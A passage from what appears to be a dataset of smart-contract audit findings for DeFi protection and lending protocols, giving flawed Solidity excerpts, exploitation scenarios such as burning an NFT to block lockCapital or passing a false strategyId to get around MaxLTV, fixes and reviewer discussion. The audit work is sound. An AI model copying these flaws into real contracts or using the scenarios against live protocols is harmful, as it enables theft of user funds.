you can see it doesn't keep track of user current withdrawal requests and user can request withdrawal for all of his balance in each cycle and by doing so user can set `withdrawalCycleDetails[Each Cycle][User]` to user's sToken balance. and whenever user wants to withdraw he only need to wait until the end of the current cycle while he should have waited until next cycle end.чTo avoid this code should keep track of user balance that is not in withdraw delay and user balance that are requested for withdraw. and to prevent users from requesting withdrawing and not doing it protocol should have some penalties for withdrawals, for example the waiting withdraw balance shouldn't get reward in waiting duration.чprotection sellers can request withdraw in each cycle for their full sToken balance and code would allow them to withdraw in each cycle end time because code doesn't track how much of the balance of users is requested for withdrawals in the past.\nCode Snippet\nTool used\nManual Review
Lending pool state transition will be broken when pool is expired in late stateчhighч```\n  function _getLendingPoolStatus(address _lendingPoolAddress)\n    internal\n    view\n    returns (LendingPoolStatus)\n  {\n    if (!_isReferenceLendingPoolAdded(_lendingPoolAddress)) {\n      return LendingPoolStatus.NotSupported;\n    }\n\n\n    ILendingProtocolAdapter _adapter = _getLendingProtocolAdapter(\n      _lendingPoolAddress\n    );\n\n\n    if (_adapter.isLendingPoolExpired(_lendingPoolAddress)) {\n      return LendingPoolStatus.Expired;\n    }\n\n\n    if (\n      _adapter.isLendingPoolLateWithinGracePeriod(\n        _lendingPoolAddress,\n        Constants.LATE_PAYMENT_GRACE_PERIOD_IN_DAYS\n      )\n    ) {\n      return LendingPoolStatus.LateWithinGracePeriod;\n    }\n\n\n    if (_adapter.isLendingPoolLate(_lendingPoolAddress)) {\n      return LendingPoolStatus.Late;\n    }\n\n\n    return LendingPoolStatus.Active;\n  }\n```\nчLending pool state transition will be broken when pool is expired in late state\n```\n  function _getLendingPoolStatus(address _lendingPoolAddress)\n    internal\n    view\n    returns (LendingPoolStatus)\n  {\n    if (!_isReferenceLendingPoolAdded(_lendingPoolAddress)) {\n      return LendingPoolStatus.NotSupported;\n    }\n\n\n    ILendingProtocolAdapter _adapter = _getLendingProtocolAdapter(\n      _lendingPoolAddress\n    );\n\n\n    if (_adapter.isLendingPoolExpired(_lendingPoolAddress)) {\n      return LendingPoolStatus.Expired;\n    }\n\n\n    if (\n      _adapter.isLendingPoolLateWithinGracePeriod(\n        _lendingPoolAddress,\n        Constants.LATE_PAYMENT_GRACE_PERIOD_IN_DAYS\n      )\n    ) {\n      return LendingPoolStatus.LateWithinGracePeriod;\n    }\n\n\n    if (_adapter.isLendingPoolLate(_lendingPoolAddress)) {\n      return LendingPoolStatus.Late;\n    }\n\n\n    return LendingPoolStatus.Active;\n  }\n```\n\n```\n  function isLendingPoolExpired(address _lendingPoolAddress)\n    external\n    view\n    override\n    returns (bool)\n  {\n    ICreditLine _creditLine = _getCreditLine(_lendingPoolAddress);\n    uint256 _termEndTimestamp = _creditLine.termEndTime();\n\n\n    /// Repaid logic derived from Goldfinch frontend code:\n    /// https://github.com/goldfinch-eng/mono/blob/bd9adae6fbd810d1ebb5f7ef22df5bb6f1eaee3b/packages/client2/lib/pools/index.ts#L54\n    /// when the credit line has zero balance with valid term end, it is considered repaid\n    return\n      block.timestamp >= _termEndTimestamp ||\n      (_termEndTimestamp > 0 && _creditLine.balance() == 0);\n  }\n```\n\nAs you can see, pool is expired if time of credit line has ended or loan is fully paid.\nState transition for lending pool is done inside `DefaultStateManager._assessState` function. This function is responsible to lock capital, when state is late and unlock it when it's changed from late to active again.\nBecause the first state that is checked is `expired` there can be few problems.\nFirst problem. Suppose that lending pool is in late state. So capital is locked. There are 2 options now: payment was done, so pool becomes active and capital unlocked, payment was not done then pool has defaulted. But in case when state is late, and lending pool expired or loan is fully repaid(so it's also becomes expired), then capital will not be unlocked as there is no such transition Late -> Expired. The state will be changed to Expired and no more actions will be done. Also in this case it's not possible to detect if lending pool expired because of time or because no payment was done.\nSecond problem. Lending pool is in active state. Last payment should be done some time before `_creditLine.termEndTime()`. Payment was not done, which means that state should be changed to Late and capital should be locked, but state was checked when loan has ended, so it became Expired and again there is no such transition that can detect that capital should be locked in this case. The state will be changed to Expired and no more actions will be done.чThese are tricky cases, think about transition for lending pool in such cases.\nDiscussion\nvnadoda\n@clems4ev3r We are planning to fix this, possibly using recommendation mentioned in a duplicate #251\nclems4ev3r\n@vnadoda agreedчDepending on situation, capital can be locked forever or protection buyers will not be compensated.\nCode Snippet\nProvided above\nTool used\nManual Review
Existing buyer who has been regularly renewing protection will be denied renewal even when she is well within the renewal grace periodчhighч```\nfunction _verifyLendingPoolIsActive(\n    IDefaultStateManager defaultStateManager,\n    address _protectionPoolAddress,\n    address _lendingPoolAddress\n  ) internal view {\n    LendingPoolStatus poolStatus = defaultStateManager.getLendingPoolStatus(\n      _protectionPoolAddress,\n      _lendingPoolAddress\n    );\n\n    // rest of code\n    if (\n      poolStatus == LendingPoolStatus.LateWithinGracePeriod ||\n      poolStatus == LendingPoolStatus.Late\n    ) {\n      revert IProtectionPool.LendingPoolHasLatePayment(_lendingPoolAddress);\n    }\n    // rest of code\n}\n```\nчExisting buyers have an opportunity to renew their protection within grace period. If lending state update happens from `Active` to `LateWithinGracePeriod` just 1 second after a buyer's protection expires, protocol denies buyer an opportunity even when she is well within the grace period.\nSince defaults are not sudden and an `Active` loan first transitions into `LateWithinGracePeriod`, it is unfair to deny an existing buyer an opportunity to renew (its alright if a new protection buyer is DOSed). This is especially so because a late loan can become `active` again in future (or move to `default`, but both possibilities exist at this stage).\nAll previous protection payments are a total loss for a buyer when she is denied a legitimate renewal request at the first sign of danger.\n`renewProtection` first calls `verifyBuyerCanRenewProtection` that checks if the user requesting renewal holds same NFT id on same lending pool address & that the current request is within grace period defined by protocol.\nOnce successfully verified, `renewProtection` calls `_verifyAndCreateProtection` to renew protection. This is the same function that gets called when a new protection is created.\nNotice that this function calls `_verifyLendingPoolIsActive` as part of its verification before creating new protection - this check denies protection on loans that are in `LateWithinGracePeriod` or `Late` phase (see snippet below).\n```\nfunction _verifyLendingPoolIsActive(\n    IDefaultStateManager defaultStateManager,\n    address _protectionPoolAddress,\n    address _lendingPoolAddress\n  ) internal view {\n    LendingPoolStatus poolStatus = defaultStateManager.getLendingPoolStatus(\n      _protectionPoolAddress,\n      _lendingPoolAddress\n    );\n\n    // rest of code\n    if (\n      poolStatus == LendingPoolStatus.LateWithinGracePeriod ||\n      poolStatus == LendingPoolStatus.Late\n    ) {\n      revert IProtectionPool.LendingPoolHasLatePayment(_lendingPoolAddress);\n    }\n    // rest of code\n}\n```\nчWhen a user is calling `renewProtection`, a different implementation of `verifyLendingPoolIsActive` is needed that allows a user to renew even when lending pool status is `LateWithinGracePeriod` or `Late`.\nRecommend using `verifyLendingPoolIsActiveForRenewal` function in renewal flow as shown below\n```\n  function verifyLendingPoolIsActiveForRenewal(\n    IDefaultStateManager defaultStateManager,\n    address _protectionPoolAddress,\n    address _lendingPoolAddress\n  ) internal view {\n    LendingPoolStatus poolStatus = defaultStateManager.getLendingPoolStatus(\n      _protectionPoolAddress,\n      _lendingPoolAddress\n    );\n\n    if (poolStatus == LendingPoolStatus.NotSupported) {\n      revert IProtectionPool.LendingPoolNotSupported(_lendingPoolAddress);\n    }\n    //------ audit - this section needs to be commented-----//\n    //if (\n    //  poolStatus == LendingPoolStatus.LateWithinGracePeriod ||\n    //  poolStatus == LendingPoolStatus.Late\n    //) {\n    //  revert IProtectionPool.LendingPoolHasLatePayment(_lendingPoolAddress);\n    //}\n    // ---------------------------------------------------------//\n\n    if (poolStatus == LendingPoolStatus.Expired) {\n      revert IProtectionPool.LendingPoolExpired(_lendingPoolAddress);\n    }\n\n    if (poolStatus == LendingPoolStatus.Defaulted) {\n      revert IProtectionPool.LendingPoolDefaulted(_lendingPoolAddress);\n    }\n  }\n```\n\nDiscussion\nvnadoda\n@clems4ev3r, @taisukemino and I will discuss this internally\nvnadoda\n@clems4ev3r planning to fix this.\nclems4ev3r\n@vnadoda yes this is a valid issue\nJeiwan\n@vnadoda Could you please clarify why this is a valid issue? And I'd appreciate if you share how you fixed it.\nIn my view, the recommended mitigation introduces a different vulnerability: allowing to renew protections in `LateWithinGracePeriod` and `Late` states gives buyers an advantage and allows to time late positions because positions in these states have a higher chance of a default. This can be exploited as follows:\nBuyers only buy protections with the minimal duration.\nExpired protections are not renewed until positions get into the `LateWithinGracePeriod` or `Late` state.\nMultiple options here: a) If positions don't get into the `LateWithinGracePeriod` state before the renewal window has expired, buyers renew positions. This allows them to not pay for the duration of the renewal window. b) When positions are in the `LateWithinGracePeriod` state and the grace period is close to running out, buyers renew their protections so that they cover the moment when the positions default. c) When positions are in the `Late` state, buyers renew their protections to cover the moment when the positions default.\nThis allows buyers to minimize the cost of protections while having an almost guaranteed way to get a protection if a position defaults.\nvnadoda\n@Jeiwan @clems4ev3r @hrishibhat Once protection is expired, buyers will have a certain time limit within which they have to renew (7-10 days). So buyers can't wait for a long time. Generally payment period for loans is 30 days. Essentially buyers have to continuously renew their protections to get the coverage.чUser who has been regularly renewing protection and paying premium to protect against a future loss event will be denied that very protection when she most needs it.\nIf existing user is denied renewal, she can never get back in (unless the lending pool becomes active again). All her previous payments were a total loss for her.\nCode Snippet\nTool used\nManual Review
Malicious seller forced break lockCapital()чhighч```\n  function lockCapital(address _lendingPoolAddress)\n    external\n    payable\n    override\n    onlyDefaultStateManager\n    whenNotPaused\n    returns (uint256 _lockedAmount, uint256 _snapshotId)\n  {\n// rest of code.\n    uint256 _length = activeProtectionIndexes.length();\n    for (uint256 i; i < _length; ) {\n// rest of code\n      uint256 _remainingPrincipal = poolInfo\n        .referenceLendingPools\n        .calculateRemainingPrincipal(            //<----------- calculate Remaining Principal\n          _lendingPoolAddress,\n          protectionInfo.buyer,\n          protectionInfo.purchaseParams.nftLpTokenId\n        );\n```\nч"Malicious burn nft causes failure to lockCapital() ，seller steady earn PremiumAmount, buyer will be lost compensation\nWhen the status of the lendingPool changes from Active to Late, the protocol will call ProtectionPool.lockCapital() to lock amount lockCapital() will loop through the active protections to calculate the `lockedAmount`. The code is as follows:\n```\n  function lockCapital(address _lendingPoolAddress)\n    external\n    payable\n    override\n    onlyDefaultStateManager\n    whenNotPaused\n    returns (uint256 _lockedAmount, uint256 _snapshotId)\n  {\n// rest of code.\n    uint256 _length = activeProtectionIndexes.length();\n    for (uint256 i; i < _length; ) {\n// rest of code\n      uint256 _remainingPrincipal = poolInfo\n        .referenceLendingPools\n        .calculateRemainingPrincipal(            //<----------- calculate Remaining Principal\n          _lendingPoolAddress,\n          protectionInfo.buyer,\n          protectionInfo.purchaseParams.nftLpTokenId\n        );\n```\n\nThe important thing inside is to calculate the _remainingPrincipal by `referenceLendingPools.calculateRemainingPrincipal()`\n```\n  function calculateRemainingPrincipal(\n    address _lendingPoolAddress,\n    address _lender,\n    uint256 _nftLpTokenId\n  ) public view override returns (uint256 _principalRemaining) {\n// rest of code\n\n    if (_poolTokens.ownerOf(_nftLpTokenId) == _lender) {   //<------------call ownerOf()\n      IPoolTokens.TokenInfo memory _tokenInfo = _poolTokens.getTokenInfo(\n        _nftLpTokenId\n      );\n\n// rest of code.\n      if (\n        _tokenInfo.pool == _lendingPoolAddress &&\n        _isJuniorTrancheId(_tokenInfo.tranche)\n      ) {\n        _principalRemaining =\n          _tokenInfo.principalAmount -\n          _tokenInfo.principalRedeemed;\n      }\n    }\n  }\n```\n\nGoldfinchAdapter.calculateRemainingPrincipal() The current implementation will first determine if the ownerOf the NFTID is _lender\nThere is a potential problem here, if the NFTID has been burned, the ownerOf() will be directly revert, which will lead to calculateRemainingPrincipal() revert,and lockCapital() revert and can't change status from active to late\nLet's see whether Goldfinch's implementation supports burn(NFTID), and whether ownerOf(NFTID) will revert\nPoolTokens has burn() method , if principalRedeemed==principalAmount you can burn it\n```\ncontract PoolTokens is IPoolTokens, ERC721PresetMinterPauserAutoIdUpgradeSafe, HasAdmin, IERC2981 {\n// rest of code..\n  function burn(uint256 tokenId) external virtual override whenNotPaused {\n    TokenInfo memory token = _getTokenInfo(tokenId);\n    bool canBurn = _isApprovedOrOwner(_msgSender(), tokenId);\n    bool fromTokenPool = _validPool(_msgSender()) && token.pool == _msgSender();\n    address owner = ownerOf(tokenId);\n    require(canBurn || fromTokenPool, ""ERC721Burnable: caller cannot burn this token"");\n    require(token.principalRedeemed == token.principalAmount, ""Can only burn fully redeemed tokens"");\n    _destroyAndBurn(tokenId);\n    emit TokenBurned(owner, token.pool, tokenId);\n  }\n```\n\n2.ownerOf() if nftid don't exists will revert with message ""ERC721: owner query for nonexistent token""\n```\ncontract ERC721UpgradeSafe is\n  Initializable,\n  ContextUpgradeSafe,\n  ERC165UpgradeSafe,\n  IERC721,\n  IERC721Metadata,\n  IERC721Enumerable\n{\n// rest of code\n  function ownerOf(uint256 tokenId) public view override returns (address) {\n    return _tokenOwners.get(tokenId, ""ERC721: owner query for nonexistent token"");\n  }\n```\n\nIf it can't changes to late, Won't lock the fund, seller steady earn PremiumAmount\nSo there are two risks\nnormal buyer gives NFTID to burn(), he does not know that it will affect all protection of the lendingPool\nMalicious seller can buy a protection first, then burn it, so as to force all protection of the lendingPool to expire and get the PremiumAmount maliciously. buyer unable to obtain compensation\nSuggested try catch for _poolTokens.ownerOf() If revert, it is assumed that the lender is not the owner"чtry catch for _poolTokens.ownerOf() If revert, it is assumed that the lender is not the ownerчbuyer will be lost compensation\nCode Snippet\nTool used\nManual Review
function lockCapital() doesn't filter the expired protections first and code may lock more funds than required and expired defaulted protections may fundedчmediumч```\n  function lockCapital(address _lendingPoolAddress)\n    external\n    payable\n    override\n    onlyDefaultStateManager\n    whenNotPaused\n    returns (uint256 _lockedAmount, uint256 _snapshotId)\n  {\n    /// step 1: Capture protection pool's current investors by creating a snapshot of the token balance by using ERC20Snapshot in SToken\n    _snapshotId = _snapshot();\n\n    /// step 2: calculate total capital to be locked\n    LendingPoolDetail storage lendingPoolDetail = lendingPoolDetails[\n      _lendingPoolAddress\n    ];\n\n    /// Get indexes of active protection for a lending pool from the storage\n    EnumerableSetUpgradeable.UintSet\n      storage activeProtectionIndexes = lendingPoolDetail\n        .activeProtectionIndexes;\n\n    /// Iterate all active protections and calculate total locked amount for this lending pool\n    /// 1. calculate remaining principal amount for each loan protection in the lending pool.\n    /// 2. for each loan protection, lockedAmt = min(protectionAmt, remainingPrincipal)\n    /// 3. total locked amount = sum of lockedAmt for all loan protections\n    uint256 _length = activeProtectionIndexes.length();\n    for (uint256 i; i < _length; ) {\n      /// Get protection info from the storage\n      uint256 _protectionIndex = activeProtectionIndexes.at(i);\n      ProtectionInfo storage protectionInfo = protectionInfos[_protectionIndex];\n\n      /// Calculate remaining principal amount for a loan protection in the lending pool\n      uint256 _remainingPrincipal = poolInfo\n        .referenceLendingPools\n        .calculateRemainingPrincipal(\n          _lendingPoolAddress,\n          protectionInfo.buyer,\n          protectionInfo.purchaseParams.nftLpTokenId\n        );\n\n      /// Locked amount is minimum of protection amount and remaining principal\n      uint256 _protectionAmount = protectionInfo\n        .purchaseParams\n        .protectionAmount;\n      uint256 _lockedAmountPerProtection = _protectionAmount <\n        _remainingPrincipal\n        ? _protectionAmount\n        : _remainingPrincipal;\n\n      _lockedAmount += _lockedAmountPerProtection;\n\n      unchecked {\n        ++i;\n      }\n    }\n\n    unchecked {\n      /// step 3: Update total locked & available capital in storage\n      if (totalSTokenUnderlying < _lockedAmount) {\n        /// If totalSTokenUnderlying < _lockedAmount, then lock all available capital\n        _lockedAmount = totalSTokenUnderlying;\n        totalSTokenUnderlying = 0;\n      } else {\n        /// Reduce the total sToken underlying amount by the locked amount\n        totalSTokenUnderlying -= _lockedAmount;\n      }\n    }\n  }\n```\nчwhen a lending loan defaults, then function `lockCapital()` get called in the ProtectionPool to lock required funds for the protections bought for that lending pool, but code doesn't filter the expired protections first and they may be expired protection in the active protection array that are not excluded and this would cause code to lock more fund and pay fund for expired defaulted protections and protection sellers would lose more funds.\nThis `lockCapital()` code:\n```\n  function lockCapital(address _lendingPoolAddress)\n    external\n    payable\n    override\n    onlyDefaultStateManager\n    whenNotPaused\n    returns (uint256 _lockedAmount, uint256 _snapshotId)\n  {\n    /// step 1: Capture protection pool's current investors by creating a snapshot of the token balance by using ERC20Snapshot in SToken\n    _snapshotId = _snapshot();\n\n    /// step 2: calculate total capital to be locked\n    LendingPoolDetail storage lendingPoolDetail = lendingPoolDetails[\n      _lendingPoolAddress\n    ];\n\n    /// Get indexes of active protection for a lending pool from the storage\n    EnumerableSetUpgradeable.UintSet\n      storage activeProtectionIndexes = lendingPoolDetail\n        .activeProtectionIndexes;\n\n    /// Iterate all active protections and calculate total locked amount for this lending pool\n    /// 1. calculate remaining principal amount for each loan protection in the lending pool.\n    /// 2. for each loan protection, lockedAmt = min(protectionAmt, remainingPrincipal)\n    /// 3. total locked amount = sum of lockedAmt for all loan protections\n    uint256 _length = activeProtectionIndexes.length();\n    for (uint256 i; i < _length; ) {\n      /// Get protection info from the storage\n      uint256 _protectionIndex = activeProtectionIndexes.at(i);\n      ProtectionInfo storage protectionInfo = protectionInfos[_protectionIndex];\n\n      /// Calculate remaining principal amount for a loan protection in the lending pool\n      uint256 _remainingPrincipal = poolInfo\n        .referenceLendingPools\n        .calculateRemainingPrincipal(\n          _lendingPoolAddress,\n          protectionInfo.buyer,\n          protectionInfo.purchaseParams.nftLpTokenId\n        );\n\n      /// Locked amount is minimum of protection amount and remaining principal\n      uint256 _protectionAmount = protectionInfo\n        .purchaseParams\n        .protectionAmount;\n      uint256 _lockedAmountPerProtection = _protectionAmount <\n        _remainingPrincipal\n        ? _protectionAmount\n        : _remainingPrincipal;\n\n      _lockedAmount += _lockedAmountPerProtection;\n\n      unchecked {\n        ++i;\n      }\n    }\n\n    unchecked {\n      /// step 3: Update total locked & available capital in storage\n      if (totalSTokenUnderlying < _lockedAmount) {\n        /// If totalSTokenUnderlying < _lockedAmount, then lock all available capital\n        _lockedAmount = totalSTokenUnderlying;\n        totalSTokenUnderlying = 0;\n      } else {\n        /// Reduce the total sToken underlying amount by the locked amount\n        totalSTokenUnderlying -= _lockedAmount;\n      }\n    }\n  }\n```\n\nAs you can see code loops through active protection array for that lending pool and calculates required locked amount but it doesn't call `_accruePremiumAndExpireProtections()` to make sure active protections doesn't include any expired protections. if function `_accruePremiumAndExpireProtections()` doesn't get called for a while, then there would be possible that some of the protections are expired and they are still in the active protection array. This would cause code to calculated more locked amount and also pay fund for those expired defaulted protections too from protection sellers. (also when calculating the required token payment for the protection code doesn't check the expiration too in the other functions that are get called by the `lockCapital()`, the expire check doesn't exists in inner function too)чcall `_accruePremiumAndExpireProtections()` for the defaulted pool to filter out the expired protections.\nDiscussion\nvnadoda\n@clems4ev3r we plan to fix this issueчsee summery\nCode Snippet\nTool used\nManual Review
If unlocked capital in pool falls below minRequiredCapital, then protection can be bought for minimum premiumчmediumч```\n    if (\n      RiskFactorCalculator.canCalculateRiskFactor(\n        _totalCapital,\n        _leverageRatio,\n        _poolParameters.leverageRatioFloor,\n        _poolParameters.leverageRatioCeiling,\n        _poolParameters.minRequiredCapital\n      )\n    ) {\n      // rest of code\n    } else {\n      /// This means that the risk factor cannot be calculated because of either\n      /// min capital not met or leverage ratio out of range.\n      /// Hence, the premium is the minimum premium\n      _isMinPremium = true;\n    }\n```\nч"If the unlocked capital in a pool falls below the minRequiredCapital, then protection can be bought for minimum premium\nIn PremiumCalculator.calculatePremium, we see that if the risk factor ""cannot be calculated,"" it uses the minimum premium.\n```\n    if (\n      RiskFactorCalculator.canCalculateRiskFactor(\n        _totalCapital,\n        _leverageRatio,\n        _poolParameters.leverageRatioFloor,\n        _poolParameters.leverageRatioCeiling,\n        _poolParameters.minRequiredCapital\n      )\n    ) {\n      // rest of code\n    } else {\n      /// This means that the risk factor cannot be calculated because of either\n      /// min capital not met or leverage ratio out of range.\n      /// Hence, the premium is the minimum premium\n      _isMinPremium = true;\n    }\n```\n\nIn RiskFactor.canCalculateRiskFactor, we see there are three conditions when this is so:\n```\n  function canCalculateRiskFactor(\n    uint256 _totalCapital,\n    uint256 _leverageRatio,\n    uint256 _leverageRatioFloor,\n    uint256 _leverageRatioCeiling,\n    uint256 _minRequiredCapital\n  ) external pure returns (bool _canCalculate) {\n    if (\n      _totalCapital < _minRequiredCapital ||\n      _leverageRatio < _leverageRatioFloor ||\n      _leverageRatio > _leverageRatioCeiling\n    ) {\n      _canCalculate = false;\n    } else {\n      _canCalculate = true;\n    }\n  }\n}\n```\n\nIf the leverage ratio is above the ceiling, then protection should be very cheap, and it is correct to use the minimum premium. If the leverage ratio is above the floor, then protection cannot be purchased.\nHowever, we see that the minimum premium is also used if _totalCapital is below _minRequiredCapital. In this case, protection should be very expensive, but it will instead be very cheap.\nTotal capital can fall this low in a couple ways. One way is if most sellers withdraw their funds and most protection positions expire. Then the pool can have a very small amount of capital while still having a leverage ratio within the window. Another is if most of the capital is locked. In that case, the protection likely cannot be bought because the leverage ratio is likely to be too low. However, when capital is locked, the corresponding protection should not count against the leverage ratio, as that can prevent buyers from buying protection even when the pool is very well capitalized ( see https://github.com/sherlock-audit/2023-02-carapace-jkoppel/issues/11 ). If that issue is fixed, then this issue can appear when capital is locked."чProhibit protection purchases when capital falls below the minimum required capital\nDiscussion\njkoppel\nEscalate for 26 USDC\nThis is not a duplicate of #325. That issue only talks about when the leverage ratio falls below the floor. As @clems4ev3r pointed out, that case is correctly handled: protection cannot be purchased at all.\nThis report talks about when the leverage ratio is within range but most funds are either withdrawn or locked. Then protection should be very expensive but is instead very cheap. And this will not revert.\nsherlock-admin\nEscalate for 26 USDC\nThis is not a duplicate of #325. That issue only talks about when the leverage ratio falls below the floor. As @clems4ev3r pointed out, that case is correctly handled: protection cannot be purchased at all.\nThis report talks about when the leverage ratio is within range but most funds are either withdrawn or locked. Then protection should be very expensive but is instead very cheap. And this will not revert.\nYou've created a valid escalation for 26 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nEvert0x\nEscalation accepted\nsherlock-admin\nEscalation accepted\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.чBuyers can get very cheap protection at a time when it should be expensive.\nCode Snippet\nTool used\nManual Review
Users who deposit extra funds into their Ichi farming positions will lose all their ICHI rewardsчhighч"```\nfunction mint(uint256 pid, uint256 amount)\n    external\n    nonReentrant\n    returns (uint256)\n{\n    address lpToken = ichiFarm.lpToken(pid);\n    IERC20Upgradeable(lpToken).safeTransferFrom(\n        msg.sender,\n        address(this),\n        amount\n    );\n    if (\n        IERC20Upgradeable(lpToken).allowance(\n            address(this),\n            address(ichiFarm)\n        ) != type(uint256).max\n    ) {\n        // We only need to do this once per pool, as LP token's allowance won't decrease if it's -1.\n        IERC20Upgradeable(lpToken).safeApprove(\n            address(ichiFarm),\n            type(uint256).max\n        );\n    }\n    ichiFarm.deposit(pid, amount, address(this));\n    // @ok if accIchiPerShare is always changing, so how does this work?\n    // it's basically just saving the accIchiPerShare at staking time, so when you unstake, it can calculate the difference\n    // really fucking smart actually\n    (uint256 ichiPerShare, , ) = ichiFarm.poolInfo(pid);\n    uint256 id = encodeId(pid, ichiPerShare);\n    _mint(msg.sender, id, amount, """");\n    return id;\n}\n```\n"ч"```\nfunction mint(uint256 pid, uint256 amount)\n    external\n    nonReentrant\n    returns (uint256)\n{\n    address lpToken = ichiFarm.lpToken(pid);\n    IERC20Upgradeable(lpToken).safeTransferFrom(\n        msg.sender,\n        address(this),\n        amount\n    );\n    if (\n        IERC20Upgradeable(lpToken).allowance(\n            address(this),\n            address(ichiFarm)\n        ) != type(uint256).max\n    ) {\n        // We only need to do this once per pool, as LP token's allowance won't decrease if it's -1.\n        IERC20Upgradeable(lpToken).safeApprove(\n            address(ichiFarm),\n            type(uint256).max\n        );\n    }\n    ichiFarm.deposit(pid, amount, address(this));\n    // @ok if accIchiPerShare is always changing, so how does this work?\n    // it's basically just saving the accIchiPerShare at staking time, so when you unstake, it can calculate the difference\n    // really fucking smart actually\n    (uint256 ichiPerShare, , ) = ichiFarm.poolInfo(pid);\n    uint256 id = encodeId(pid, ichiPerShare);\n    _mint(msg.sender, id, amount, """");\n    return id;\n}\n```\n\nThe resulting ERC1155 is posted as collateral in the Blueberry Bank.\nIf the user decides to add more funds to this position, they simply call `openPositionFarm()` again. The function has logic to check if there is already existing collateral of this LP token in the Blueberry Bank. If there is, it removes the collateral and calls `wIchiFarm.burn()` (which harvests the Ichi rewards and withdraws the LP tokens) before repeating the deposit process.\n```\nfunction burn(uint256 id, uint256 amount)\n    external\n    nonReentrant\n    returns (uint256)\n{\n    if (amount == type(uint256).max) {\n        amount = balanceOf(msg.sender, id);\n    }\n    (uint256 pid, uint256 stIchiPerShare) = decodeId(id);\n    _burn(msg.sender, id, amount);\n\n    uint256 ichiRewards = ichiFarm.pendingIchi(pid, address(this));\n    ichiFarm.harvest(pid, address(this));\n    ichiFarm.withdraw(pid, amount, address(this));\n\n    // Convert Legacy ICHI to ICHI v2\n    if (ichiRewards > 0) {\n        ICHIv1.safeApprove(address(ICHI), ichiRewards);\n        ICHI.convertToV2(ichiRewards);\n    }\n\n    // Transfer LP Tokens\n    address lpToken = ichiFarm.lpToken(pid);\n    IERC20Upgradeable(lpToken).safeTransfer(msg.sender, amount);\n\n    // Transfer Reward Tokens\n    (uint256 enIchiPerShare, , ) = ichiFarm.poolInfo(pid);\n    uint256 stIchi = (stIchiPerShare * amount).divCeil(1e18);\n    uint256 enIchi = (enIchiPerShare * amount) / 1e18;\n\n    if (enIchi > stIchi) {\n        ICHI.safeTransfer(msg.sender, enIchi - stIchi);\n    }\n    return pid;\n}\n```\n\nFor an example of how this is handled properly, we can look at the opposite function, `closePositionFarm()`. In this case, the same `wIchiFarm.burn()` function is called. But in this case, it's followed up with an explicit call to withdraw the ICHI from the contract to the user.\n```\ndoRefund(ICHI);\n```\n\nThis `doRefund()` function refunds the contract's full balance of ICHI to the `msg.sender`, so the result is that the next user to call `closePositionFarm()` will steal the ICHI tokens from the original user who added to their farming position."ч
LP tokens are not sent back to withdrawing userчhighч```\ndoTakeCollateral(strategies[strategyId].vault, lpTakeAmt);\n```\nчThe following arguments are passed to the function:\nstrategyId: an index into the `strategies` array, which specifies the Ichi vault in question\ncollToken: the underlying token, which is withdrawn from Compound\namountShareWithdraw: the number of underlying tokens to withdraw from Compound\nborrowToken: the token that was borrowed from Compound to create the position, one of the underlying tokens of the vault\namountRepay: the amount of the borrow token to repay to Compound\namountLpWithdraw: the amount of the LP token to withdraw, rather than trade back into borrow tokens\nIn order to accomplish these goals, the contract does the following...\nRemoves the LP tokens from the ERC1155 holding them for collateral.\n```\ndoTakeCollateral(strategies[strategyId].vault, lpTakeAmt);\n```\n\nCalculates the number of LP tokens to withdraw from the vault.\n```\nuint256 amtLPToRemove = vault.balanceOf(address(this)) - amountLpWithdraw;\nvault.withdraw(amtLPToRemove, address(this));\n```\n\nConverts the non-borrowed token that was withdrawn in the borrowed token (not copying the code in, as it's not relevant to this issue).\nWithdraw the underlying token from Compound.\n```\ndoWithdraw(collToken, amountShareWithdraw);\n```\n\nPay back the borrowed token to Compound.\n```\ndoRepay(borrowToken, amountRepay);\n```\n\nValidate that this situation does not put us above the maxLTV for our loans.\n```\n_validateMaxLTV(strategyId);\n```\n\nSends the remaining borrow token that weren't paid back and withdrawn underlying tokens to the user.\n```\ndoRefund(borrowToken);\ndoRefund(collToken);\n```\n\nCrucially, the step of sending the remaining LP tokens to the user is skipped, even though the function specifically does the calculations to ensure that `amountLpWithdraw` is held back from being taken out of the vault.чAdd an additional line to the `withdrawInternal()` function to refund all LP tokens as well:\n```\n  doRefund(borrowToken);\n  doRefund(collToken);\n// Add the line below\n doRefund(address(vault));\n```\n\nDiscussion\nGornutz\nduplicate of 34чUsers who close their positions and choose to keep LP tokens (rather than unwinding the position for the constituent tokens) will have their LP tokens stuck permanently in the IchiVaultSpell contract.\nCode Snippet\nTool used\nManual Review
Users can get around MaxLTV because of lack of strategyId validationчhighч```\nfunction _validateMaxLTV(uint256 strategyId) internal view {\n    uint256 debtValue = bank.getDebtValue(bank.POSITION_ID());\n    (, address collToken, uint256 collAmount, , , , , ) = bank\n        .getCurrentPositionInfo();\n    uint256 collPrice = bank.oracle().getPrice(collToken);\n    uint256 collValue = (collPrice * collAmount) /\n        10**IERC20Metadata(collToken).decimals();\n\n    if (\n        debtValue >\n        (collValue * maxLTV[strategyId][collToken]) / DENOMINATOR\n    ) revert EXCEED_MAX_LTV();\n}\n```\nчWhen a user withdraws some of their underlying token, there is a check to ensure they still meet the Max LTV requirements. However, they are able to arbitrarily enter any `strategyId` that they would like for this check, which could allow them to exceed the LTV for their real strategy while passing the approval.\nAs a result, the `_validateMaxLTV(strategyId)` function is called to ensure they remain compliant with their strategy's specified LTV:\n```\nfunction _validateMaxLTV(uint256 strategyId) internal view {\n    uint256 debtValue = bank.getDebtValue(bank.POSITION_ID());\n    (, address collToken, uint256 collAmount, , , , , ) = bank\n        .getCurrentPositionInfo();\n    uint256 collPrice = bank.oracle().getPrice(collToken);\n    uint256 collValue = (collPrice * collAmount) /\n        10**IERC20Metadata(collToken).decimals();\n\n    if (\n        debtValue >\n        (collValue * maxLTV[strategyId][collToken]) / DENOMINATOR\n    ) revert EXCEED_MAX_LTV();\n}\n```\n\nTo summarize, this check:\nPulls the position's total debt value\nPulls the position's total value of underlying tokens\nPulls the specified maxLTV for this strategyId and underlying token combination\nEnsures that `underlyingTokenValue * maxLTV > debtValue`\nBut there is no check to ensure that this `strategyId` value corresponds to the strategy the user is actually invested in, as we can see the `reducePosition()` function:\n```\nfunction reducePosition(\n    uint256 strategyId,\n    address collToken,\n    uint256 collAmount\n) external {\n    doWithdraw(collToken, collAmount);\n    